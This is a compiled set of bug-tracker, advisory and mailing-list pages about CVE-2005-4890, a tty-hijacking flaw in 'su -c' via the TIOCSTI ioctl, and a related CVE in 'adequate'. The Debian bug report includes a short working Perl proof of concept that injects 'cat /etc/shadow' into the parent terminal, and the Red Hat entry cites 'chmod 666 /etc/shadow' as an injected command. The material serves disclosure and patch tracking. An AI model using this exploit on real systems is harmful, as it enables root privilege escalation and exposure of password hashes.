  2,095](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Ago)
* [Maven
  5,265](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Amaven)
* [npm
  3,760](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Anpm)
* [NuGet
  678](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Anuget)
* [pip
  3,446](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Apip)
* [Pub
  12](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Apub)
* [RubyGems
  892](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Arubygems)
* [Rust
  882](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Arust)
* [Swift
  37](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Aswift)

## Unreviewed advisories

* [All unreviewed
  242,536](/advisories?query=CVE-2005-4890+type%3Aunreviewed)

[CC-BY-4.0 License](https://docs.github.com/en/github/site-policy/github-additional-product-terms#12-advisory-database)
[Language support](https://docs.github.com/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/about-the-github-advisory-database#github-reviewed-advisories)
[About GitHub Advisory Database](https://docs.github.com/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/about-the-github-advisory-database)

Filter advisories

### Filter advisories

GitHub reviewed advisories
[All reviewed

5,000+](/advisories?query=CVE-2005-4890+type%3Areviewed)
[Composer

4,333](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Acomposer)
[Erlang

31](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Aerlang)
[GitHub Actions

22](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Aactions)
[Go

2,095](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Ago)
[Maven

5,000+](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Amaven)
[npm

3,760](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Anpm)
[NuGet

678](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Anuget)
[pip

3,446](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Apip)
[Pub

12](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Apub)
[RubyGems

892](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Arubygems)
[Rust

882](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Arust)
[Swift

37](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Aswift)
Unreviewed advisories
[All unreviewed

5,000+](/advisories?query=CVE-2005-4890+type%3Aunreviewed)

 Search

## 1 advisory

Filter by severity
Filter by CWE
Sort by

Severity

Filter by severity

[All severities](/advisories?query=CVE-2005-4890)
[Low](/advisories?query=CVE-2005-4890+severity%3Alow)
[Moderate](/advisories?query=CVE-2005-4890+severity%3Amoderate)
[High](/advisories?query=CVE-2005-4890+severity%3Ahigh)
[Critical](/advisories?query=CVE-2005-4890+severity%3Acritical)

CWE

 Loading

Sort

Sort by

[Newest](/advisories?query=CVE-2005-4890)
[Oldest](/advisories?query=CVE-2005-4890+sort%3Apublished-asc)
[Recently updated](/advisories?query=CVE-2005-4890+sort%3Aupdated-desc)
[Least recently updated](/advisories?query=CVE-2005-4890+sort%3Aupdated-asc)

[There is a possible tty hijacking in shadow 4.x before 4.1.5 and sudo 1.x before 1.7.4 via "su -...](/advisories/GHSA-3p48-pw9r-4325)
High

Unreviewed

CVE-2005-4890

was published
Apr 21, 2022

**ProTip!**
Advisories are also available from the
[GraphQL API](https://docs.github.com/graphql/reference/queries#securityadvisories)

[CC-BY-4.0 License](https://docs.github.com/en/github/site-policy/github-additional-product-terms#12-advisory-database)
[Language support](https://docs.github.com/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/about-the-github-advisory-database#github-reviewed-advisories)
[About GitHub Advisory Database](https://docs.github.com/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/about-the-github-advisory-database)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from bugzilla.suse.com_52124792_20250126_050034.html ===


| Bugzilla – Search by bug number |
| --- |

|  |
| --- |

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fkeywords%3Did)
* |
  [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

You may find a single bug by entering its bug id here:

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fkeywords%3Did)
  + |
    [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

+ Legal:
+ [openSUSE](http://en.opensuse.org/Terms_of_site)
+ [SUSE](https://www.suse.com/company/legal/)



=== Content from www.openwall.com_3f49ee4c_20250125_011810.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](4) [[next>]](6) [[<thread-prev]](../../../2013/11/28/10) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <52984A1A.80909@redhat.com>
Date: Fri, 29 Nov 2013 01:02:34 -0700
From: Kurt Seifried <kseifried@...hat.com>
To: oss-security@...ts.openwall.com
CC: team@...urity.debian.org
Subject: Re: CVE Request: adequate: privilege escalation via
 tty hijacking

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

On 11/28/2013 04:41 AM, Salvatore Bonaccorso wrote:
> Hi Kurt,
>
> I would like to request a CVE for an issue with 'adequate':
>
> <http://bugs.debian.org/730691> (adequate: privilege escalation via
> tty hijacking):
>
> ----cut---------cut---------cut---------cut---------cut---------cut-----
>
>
Package: adequate
> Version: 0.4 Severity: serious Tags: security Justification: user
> security hole
>
> If root uses the --user option, then the user can hijack the tty
> with the TIOCSTI ioctl.
>
> This is similar to CVE-2005-4890.
>

Please use CVE-2013-6409 for this issue.

- --
Kurt Seifried Red Hat Security Response Team (SRT)
PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.15 (GNU/Linux)

iQIcBAEBAgAGBQJSmEoZAAoJEBYNRVNeJnmTPY8P/0vsH+KVUmCJK5CVGDh2EkDX
GP8JoZjBzdaasyCK0QoNiNtkShrea4Uju6ngOFxMYJouo7xa29mZ4oTI71W+ehIA
ff6TlDPvbO17DcOwjR+FhhY2vCcbXU3sLyWZGAgbnQAW+GQbxcFyVVF/Ws00Ejc8
frS9pyvZVkmBJogoWnd2QR1FVRYBajizlJB9KSZMEjiVrPpUo5ARNxKUiRVHEv7n
glHKF82ZxqSDSNZ1QRhnNlcx7n14XrnhlUia0GsYqzF1hDLh/5M5RmU9dCayZOUe
noGrLLt3BA21hAIjQMSyURSklQgoQFThjsOynsA7XKu8j/uvCTU49lUClROf75/G
TmCGQKrzciheRRN/ezstb5GledYNRQtO+8ShcOHeKAaaQ3dMowy4xonSrVBxSw3s
1lXgtYE1oMPis25FaepSXydcSLU9DdPAujig+2m5v5Fv4t5u39QyKxZcOrkg4a9B
725mIr3yIkPWfr8ECSCOZqDeK6SOTy8578+jnlkrch1CQxrP21nNoO+cDYpaFmdF
wM9F3XQb8NOBfOd+gQMBxSBx62S9UHC+6/MzhKgnwzP1eZqojSEDgdWuX60Kt4LL
idKA5P+bz03nfdPcFTQXLqF9mtX8uvGtlsaKne5SvsBIoox/RQd1QNkxFXFM6f/h
Duy1GvBKmHcGYH32/vbA
=U2b4
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from marc.info_24a4a5a7_20250126_050022.html ===


| Search: [] List [] Subjects [] Authors [] Bodies for list 'full-disclosure' |
| --- |

Set Page Width:
[ [80](?l=full-disclosure&s=CVE-2005-4890&w=1) ]
[ [90](?l=full-disclosure&s=CVE-2005-4890&w=2) ]
[ [100](?l=full-disclosure&s=CVE-2005-4890&w=3) ]
[ [120](?l=full-disclosure&s=CVE-2005-4890&w=4) ]

[![Viewing messages in list](images/folderopen.gif) **full-disclosure**](?l=full-disclosure&r=1&w=2)
[![- ](images/bookclosed.gif) 2025-01-01 - 2025-02-01 (8 messages)](?l=full-disclosure&r=1&b=202501&w=2)

No hits found for 'cve-2005-4890'

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from www.openwall.com_d3b3eec5_20250125_011809.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](9) [[next>]](11) [[thread-next>]](../../../2013/11/29/5) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20131128114149.GA31082@lorien.valinor.li>
Date: Thu, 28 Nov 2013 12:41:49 +0100
From: Salvatore Bonaccorso <carnil@...ian.org>
To: oss-security@...ts.openwall.com
Cc: team@...urity.debian.org
Subject: CVE Request: adequate: privilege escalation via tty hijacking

Hi Kurt,

I would like to request a CVE for an issue with 'adequate':

 <http://bugs.debian.org/730691> (adequate: privilege escalation via tty
 hijacking):

----cut---------cut---------cut---------cut---------cut---------cut-----
Package: adequate
Version: 0.4
Severity: serious
Tags: security
Justification: user security hole

If root uses the --user option, then the user can hijack the tty with
the
TIOCSTI ioctl.

This is similar to CVE-2005-4890.

--
Jakub Wilk
----cut---------cut---------cut---------cut---------cut---------cut-----

Fix for this was commited at:

 <https://bitbucket.org/jwilk/adequate/commits/94e5fc5d810057bffb673501ed809f7c2dabd9ee>

Could a CVE be assigned to this issue?

Regards,
Salvatore

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from bugzilla.redhat.com_ad8b2d7d_20250126_050052.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3DCVE-2005-4890)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3DCVE-2005-4890)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3DCVE-2005-4890)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 710208

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 710208**](show_bug.cgi?id=710208)
(CVE-2005-4890)
- [CVE-2005-4890](https://access.redhat.com/security/cve/CVE-2005-4890) coreutils: tty hijacking possible in "su" via TIOCSTI ioctl

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2005-4890 coreutils: tty hijacking possible in "su" via TIOCSTI ioctl

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED WONTFIX | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2005-4890 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | high | | [Severity:](page.cgi?id=fields.html#bug_severity) | high | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [173008](show_bug.cgi?id=173008 "CLOSED RAWHIDE - Need to call setsid() when starting daemons to prevent TIOCSTI attacks") | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [712417](show_bug.cgi?id=712417) | | TreeView+ | [depends on](buglist.cgi?bug_id=710208&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=710208&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2011-06-02 17:13 UTC by Jan Lieskovsky | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2021-02-24 15:20 UTC ([History](show_activity.cgi?id=710208)) | | [CC List:](page.cgi?id=fields.html#cclist) | 8 users (show)  aquini kdudka maxamillion meyering ovasik pasteur prc twaugh | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2012-04-16 10:46:32 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | | |  |
| --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=710208#c0)  Jan Lieskovsky    2011-06-02 17:13:23 UTC  ``` Quoting first paragraph from [1]: [https://bugzilla.redhat.com/show_bug.cgi?id=173008](show_bug.cgi?id=173008 "CLOSED RAWHIDE - Need to call setsid() when starting daemons to prevent TIOCSTI attacks")  for issue description: ====================== When starting a program via "su - user -c program" the user session can escape  to the parent session by using the TIOCSTI ioctl to push characters into the  input buffer.  This allows for example a non-root session to push  "chmod 666 /etc/shadow" or similarly bad commands into the input buffer such  that after the end of the session they are executed.   References: [1] [https://bugzilla.redhat.com/show_bug.cgi?id=173008](show_bug.cgi?id=173008 "CLOSED RAWHIDE - Need to call setsid() when starting daemons to prevent TIOCSTI attacks") [2] <http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=628843>   ```  [Comment 1](show_bug.cgi?id=710208#c1)  Jan Lieskovsky    2011-06-02 17:17:23 UTC  ``` This issue affects the version of the coreutils package, as shipped with Red Hat Enterprise Linux 4.  --  This issue did NOT affect the versions of the coreutils package, as shipped with Red Hat Enterprise Linux 5 and 6, as those versions already contain patch from [bug #173008](show_bug.cgi?id=173008 "CLOSED RAWHIDE - Need to call setsid() when starting daemons to prevent TIOCSTI attacks").  This issue did NOT affect the versions of the coreutils package, as shipped with Fedora release of 13, 14 and 15, as those versions already contain patch from [bug #173008](show_bug.cgi?id=173008 "CLOSED RAWHIDE - Need to call setsid() when starting daemons to prevent TIOCSTI attacks").   ```  [Comment 2](show_bug.cgi?id=710208#c2)  Jan Lieskovsky    2011-06-02 17:24:28 UTC  ``` CVE request: [3] <http://www.openwall.com/lists/oss-security/2011/06/02/3>   ```  [Comment 3](show_bug.cgi?id=710208#c3)  Tomas Hoger    2011-06-07 08:05:41 UTC  ``` Previous bugs related to this issue, and the possible problems of such fix:  [bug #173008](show_bug.cgi?id=173008 "CLOSED RAWHIDE - Need to call setsid() when starting daemons to prevent TIOCSTI attacks"), [bug #199066](show_bug.cgi?id=199066 "CLOSED RAWHIDE - su -c does not need to call setsid() when target is root"), [bug #280231](show_bug.cgi?id=280231), [bug #479145](show_bug.cgi?id=479145 "CLOSED ERRATA - (sudo -u less_privileged_user command) privilege escalation")  It should also be noted that the fix adding setsid() calls only protects 'su -c' use case, but not the case when root only does 'su - user' and type in commands there interactively.   ```  [Comment 4](show_bug.cgi?id=710208#c4)  Huzaifa S. Sidhpurwala    2011-12-20 04:18:26 UTC  ``` This has been assigned [CVE-2005-4890](https://access.redhat.com/security/cve/CVE-2005-4890) as per: <http://seclists.org/oss-sec/2011/q4/522>   ```  [Comment 5](show_bug.cgi?id=710208#c5)  Huzaifa S. Sidhpurwala    2012-04-16 10:46:32 UTC  ``` Statement:  This issue affects the version of coreutils package, as shipped with Red Hat Enterprise Linux 4. Red Hat Enterprise Linux 4 is however in the Extended Life Cycle Support (ELS) phase. This issue is not currently planned to be addressed in future updates. For additional information, refer to the Red Hat Enterprise Linux Life Cycle: <https://access.redhat.com/support/policy/updates/errata/>.   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=710208&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from bugs.debian.org_711c8fab_20250126_050031.html ===

# Debian Bug report logs - #628843 login: tty hijacking possible in "su" via TIOCSTI ioctl

[![version graph](version.cgi?fixed=1%3A4.5-1.1;absolute=0;width=2;collapse=1;found=shadow%2F1%3A4.1.4.2%2Bsvn3283-1;found=shadow%2F1%3A4.2-3%2Bdeb8u1;height=2;package=src%3Ashadow)](version.cgi?absolute=0;info=1;package=src%3Ashadow;found=shadow%2F1%3A4.1.4.2%2Bsvn3283-1;found=shadow%2F1%3A4.2-3%2Bdeb8u1;collapse=1;fixed=1%3A4.5-1.1)

Package:
[src:shadow](pkgreport.cgi?src=shadow);
Maintainer for [src:shadow](pkgreport.cgi?src=shadow) is [Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>](pkgreport.cgi?maint=pkg-shadow-devel%40lists.alioth.debian.org);

Reported by: [Daniel Ruoso <daniel@ruoso.com>](pkgreport.cgi?submitter=daniel%40ruoso.com)

Date: Wed, 1 Jun 2011 19:27:02 UTC

Severity: important

Tags: confirmed, help, security

Found in versions shadow/1:4.1.4.2+svn3283-1, shadow/1:4.2-3+deb8u1

Fixed in version 1:4.5-1.1

**Done:** Jakub Wilk <jwilk@jwilk.net>

Bug is archived. No further changes may be made.

Display info messages

View this report as an [mbox folder](bugreport.cgi?bug=628843;mbox=yes), [status mbox](bugreport.cgi?bug=628843;mbox=yes;mboxstatus=yes), [maintainer mbox](bugreport.cgi?bug=628843;mbox=yes;mboxmaint=yes)

---

**Report forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Wed, 01 Jun 2011 19:27:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=2), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=2), [link](#1)).

---

**Acknowledgement sent**
to `Daniel Ruoso <daniel@ruoso.com>`:

New Bug report received and forwarded. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Wed, 01 Jun 2011 19:27:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=4), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=4), [link](#3)).

---

[Message #5](#5) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=5), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=5), reply):

![](/cgi-bin/libravatar.cgi?email=daniel%40ruoso.com)
From: Daniel Ruoso <daniel@ruoso.com>
To: Debian Bug Tracking System <submit@bugs.debian.org>
Subject: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Wed, 1 Jun 2011 15:24:47 -0400
```
Package: login
Version: 1:4.1.4.2+svn3283-2+squeeze1
Severity: critical

After investigating why RedHat have a different behavior regarding "su -c" I
found out that there was a patch in RedHat to prevent tty hijacking when using
"su -c".

What makes the hijacking possible is that "su -c" still gives the command a
controlling tty, which means it has ioctl access to /dev/tty. This means it
can send things to the tty input buffer, which will be read just after su
ends.

The original report (with patch) on RedHat (from 2005?!?!?!) is:
<https://bugzilla.redhat.com/show_bug.cgi?format=multiple&id=173008>

A very simple exploit follows (Perl code)

____BEGIN_CODE____
#!/usr/bin/perl
require "sys/ioctl.ph";
open my $tty_fh, '<', '/dev/tty' or die $!;
foreach my $c (split //, 'cat /etc/shadow'.$/) {
    ioctl($tty_fh, &TIOCSTI, $c);
}
____END_CODE____

The scenario is:

Root runs a command as a less priviledged user with "su -c", if the user was
compromised, the script will be able to run commands as root by injecting
keystrokes on the terminal.

-- System Information:
Debian Release: 6.0.1
  APT prefers stable-updates
  APT policy: (500, 'stable-updates'), (500, 'stable')
Architecture: i386 (i686)

Kernel: Linux 2.6.32-5-686 (SMP w/1 CPU core)
Locale: LANG=en_US.utf8, LC_CTYPE=en_US.utf8 (charmap=UTF-8)
Shell: /bin/sh linked to /bin/dash

Versions of packages login depends on:
ii  libc6                         2.11.2-10  Embedded GNU C Library: Shared lib
ii  libpam-modules                1.1.1-6.1  Pluggable Authentication Modules f
ii  libpam-runtime                1.1.1-6.1  Runtime support for the PAM librar
ii  libpam0g                      1.1.1-6.1  Pluggable Authentication Modules l

login recommends no packages.

login suggests no packages.

-- no debconf information

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Thu, 02 Jun 2011 05:39:08 GMT) ([full text](bugreport.cgi?bug=628843;msg=7), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=7), [link](#6)).

---

**Acknowledgement sent**
to `Christian PERRIER <bubulle@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Thu, 02 Jun 2011 05:39:08 GMT) ([full text](bugreport.cgi?bug=628843;msg=9), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=9), [link](#8)).

---

[Message #10](#10) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=10), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=10), reply):

![](/cgi-bin/libravatar.cgi?email=bubulle%40debian.org)
From: Christian PERRIER <bubulle@debian.org>
To: team@security.debian.org
Cc: 628843@bugs.debian.org, 628843-submitter@bugs.debian.org
Subject: (forw) [Pkg-shadow-devel] Bug#628843: login: tty hijacking possible
in "su" via TIOCSTI ioctl
Date: Thu, 2 Jun 2011 07:34:59 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=10) (text/plain, inline)]
```
```
tags 628843 help security
thanks

Security team, I need advice and help here. My co-maintainer for
